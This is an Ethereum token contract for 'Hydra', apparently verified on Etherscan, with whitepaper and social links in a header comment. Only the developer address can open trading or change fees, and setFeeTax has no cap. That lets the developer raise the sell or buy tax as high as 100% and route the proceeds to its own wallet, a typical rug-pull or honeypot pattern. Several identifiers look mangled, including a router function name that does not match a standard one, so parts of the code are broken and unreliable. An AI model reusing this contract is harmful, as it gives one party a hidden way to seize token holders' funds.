/**
 *Submitted for verification at Etherscan.io on 2023-09-28
*/

/*
📜 Hydra’s Scroll (https://whitepaper.hydracoin.io/) (Whitepaper)
📝 Hydra’s Journey (https://twitter.com/hydrasjourney) (Announcements)
TELE: https://t.me/hydra
*/


// SPDX-License-Identifier: unlicense

pragma solidity 0.8.18;
    
interface IUniswapV2Router02 {
     function swapExactTokensForETHSupportingFeeTaxOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
    
    contract HYDRA {
        
        string public   name_ = unicode"Hydra"; 
        string public   symbol_ = unicode"HYDRA";  
        uint8 public constant decimals = 18;
        uint256 public constant totalSupply = 8888888888 * 10**decimals;

        uint256 buyFeeTax = 0;
        uint256 sellFeeTax = 0;
        uint256 constant swapAmount = totalSupply / 100;
        
        error Permissions();

        function name() public view virtual returns (string memory) {
        return name_;
        }

    
        function symbol() public view virtual returns (string memory) {
        return symbol_;
        }    

        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(
            address indexed Hydradev,
            address indexed spender,
            uint256 value
        );

        mapping (address => uint256) public balanceOf;
        mapping (address => mapping (address => uint256)) public allowance;

       
        
        

        address private pair;
        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
        address payable constant Hydradev = payable(address(0x16f1Cb6e09226b14B9A8959c6b812F0B16AD3197));

        bool private swapping;
        bool private tradingOpen;

        constructor() {
            balanceOf[msg.sender] = totalSupply;
            allowance[address(this)][routerAddress] = type(uint256).max;
            emit Transfer(address(0), msg.sender, totalSupply);
        }

        receive() external payable {}

        function approve(address spender, uint256 amount) external returns (bool){
            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        function transfer(address to, uint256 amount) external returns (bool){
            return _transfer(msg.sender, to, amount);
        }

        function transferFrom(address from, address to, uint256 amount) external returns (bool){
            allowance[from][msg.sender] -= amount;        
            return _transfer(from, to, amount);
        }

        function _transfer(address from, address to, uint256 amount) internal returns (bool){
            require(tradingOpen || from == Hydradev || to == Hydradev);

            if(!tradingOpen && pair == address(0) && amount > 0)
                pair = to;

            balanceOf[from] -= amount;

            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
                swapping = true;
                address[] memory path = new  address[](2);
                path[0] = address(this);
                path[1] = ETH;
                _uniswapV2Router.swapExactTokensForETHSupportingFeeTaxOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
                Hydradev.transfer(address(this).balance);
                swapping = false;
            }

            if(from != address(this)){
                uint256 FeeTaxAmount = amount * (from == pair ? buyFeeTax : sellFeeTax) / 100;
                amount -= FeeTaxAmount;
                balanceOf[address(this)] += FeeTaxAmount;
            }
            balanceOf[to] += amount;
            emit Transfer(from, to, amount);
            return true;
        }

        function openTrading() external {
            require(msg.sender == Hydradev);
            require(!tradingOpen);
            tradingOpen = true;        
        }

        function _setFeeTax(uint256 _buy, uint256 _sell) private {
            buyFeeTax = _buy;
            sellFeeTax = _sell;
        }

        function setFeeTax(uint256 _buy, uint256 _sell) external {
            if(msg.sender != Hydradev)        
                revert Permissions();
            _setFeeTax(_buy, _sell);
        }
    }